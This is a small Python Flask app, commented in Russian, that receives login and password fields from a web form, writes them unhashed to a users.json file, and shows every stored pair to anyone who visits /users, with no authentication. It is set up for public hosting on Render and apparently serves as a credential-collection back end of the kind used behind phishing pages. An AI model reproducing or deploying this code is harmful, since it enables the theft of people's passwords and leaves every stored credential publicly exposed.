from flask import Flask, request, render_template, redirect
import json
import os

app = Flask(__name__)

# Главная страница
@app.route("/")
def index():
    return render_template("index.html")

# Обработка формы
@app.route("/submit", methods=["POST"])
def submit():
    data = {
        "login": request.form.get("login"),
        "password": request.form.get("password")
    }

    try:
        with open("users.json", "r") as f:
            users = json.load(f)
    except:
        users = []

    users.append(data)

    with open("users.json", "w") as f:
        json.dump(users, f, indent=4)

    return redirect("/")

# Просмотр сохранённых данных
@app.route("/users")
def view_users():
    try:
        with open("users.json", "r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "Файл пустой или не найден"

# ВАЖНО для Render
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
